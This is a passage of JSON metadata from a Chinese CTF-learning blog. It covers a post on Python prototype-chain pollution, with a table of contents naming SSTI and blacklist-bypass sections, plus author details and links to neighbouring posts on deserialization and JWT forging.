分隔的环境变量，这些变量在进程启动时被设置</code></p>\n","text":"python变种原型链污染**dst.get(k)**： 这是在字典 dst 中查找键 k 对应的值。如果键 k 存在，则返回对应的值；如果键 k 不存在，则返...","permalink":"/post/python原型链污染","photos":[],"count_time":{"symbolsCount":"7.4k","symbolsTime":"7 mins."},"categories":[],"tags":[{"name":"ctf","slug":"ctf","count":7,"path":"api/tags/ctf.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#python%E5%8F%98%E7%A7%8D%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93\"><span class=\"toc-text\">python变种原型链污染</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%8D%B1%E9%99%A9%E4%BB%A3%E7%A0%81-%EF%BC%88%E7%89%B9%E5%BE%81%EF%BC%89\"><span class=\"toc-text\">危险代码 （特征）</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93\"><span class=\"toc-text\">python原型链污染</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Jinja-Mark\"><span class=\"toc-text\">Jinja Mark</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%BB%95%E8%BF%87%E9%BB%91%E5%90%8D%E5%8D%95\"><span class=\"toc-text\">绕过黑名单</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#SSTI%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">SSTI注入</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%89%B9%E6%AE%8A%E5%8F%98%E9%87%8F%E4%B8%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E7%9A%84%E5%85%B3%E7%B3%BB\"><span class=\"toc-text\">特殊变量与原型链污染的关系</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%9C%A3%E9%92%A5%E4%B9%8B%E6%88%981-0\"><span class=\"toc-text\">圣钥之战1.0</span></a></li></ol></li></ol></li></ol>","author":{"name":"Sygsdsg","slug":"blog-author","avatar":"https://img.picui.cn/free/2024/10/23/6718a2ef955e1.jpg","link":"/","description":"嘻嘻","socials":{"github":"https://github.com/Sygsdsg/Sygsdsg.github.io","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"hidden":false,"prev_post":{"title":"反序列化","uid":"e989353c677dc5e8d2584f5f2bf0b5e8","slug":"反序列化","date":"2024-11-12T13:36:33.000Z","updated":"2024-11-12T13:38:06.267Z","comments":true,"path":"api/articles/反序列化.json","keywords":null,"cover":"/image/6.png","text":"Unserialize前置知识 序列化后语句为 1a:3:{s:4:\"name\";s:8:\"John Doe\";s:3:\"age\";i:25;s:6:\"grad...","permalink":"/post/反序列化","photos":[],"count_time":{"symbolsCount":"3.3k","symbolsTime":"3 mins."},"categories":[{"name":"ctf入门","slug":"ctf入门","count":7,"path":"api/categories/ctf入门.json"}],"tags":[{"name":"ctf","slug":"ctf","count":7,"path":"api/tags/ctf.json"}],"author":{"name":"Sygsdsg","slug":"blog-author","avatar":"https://img.picui.cn/free/2024/10/23/6718a2ef955e1.jpg","link":"/","description":"嘻嘻","socials":{"github":"https://github.com/Sygsdsg/Sygsdsg.github.io","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"赛题总结3","uid":"a31a5557cbeb213ac7cdc723f501dbeb","slug":"赛题总结3","date":"2024-10-31T12:43:45.000Z","updated":"2024-10-31T12:44:43.827Z","comments":true,"path":"api/articles/赛题总结3.json","keywords":null,"cover":"/image/11.png","text":"JWT令牌伪造JSON Web Token HFCTF2020 EasyLoginhttps://buuoj.cn/challenges#[HFCTF2020]...","permalink":"/post/赛题总结3","photos":[],"count_time":{"symbolsCount":"17k","symbolsTime":"15 mins."},"categories":[],"tags":[{"name":"赛题","slug":"赛题","count":3,"path":"api/tags/赛题.json"}],"author":{"name":"Sygsdsg","slug":"blog-author","avatar":"https://img.picui.cn/free/2024/10/23/6718a2ef955e1.jpg","link":"/","description":"嘻嘻","socials":{"github":"https://github.com/Sygsdsg/Sygsdsg.github.io","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}